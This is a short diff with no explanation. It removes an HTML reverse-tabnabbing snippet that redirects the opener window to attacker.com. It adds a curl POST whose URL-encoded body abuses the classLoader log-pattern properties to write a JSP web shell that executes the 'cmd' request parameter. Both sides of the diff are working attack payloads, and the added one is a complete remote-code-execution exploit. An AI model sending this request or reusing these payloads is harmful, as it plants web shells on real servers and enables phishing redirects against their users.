@@ -1,8 +1,1 @@
-<html>
-  <script>
-    if (window.opener && !window.opener.closed) {
-      window.opener.location = "http://attacker.com";
-    }
-  </script>
-  Blah
-</html>
+curl -X POST http://abc.com/ -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di' -H "Content-Type: application/x-www-form-urlencoded"
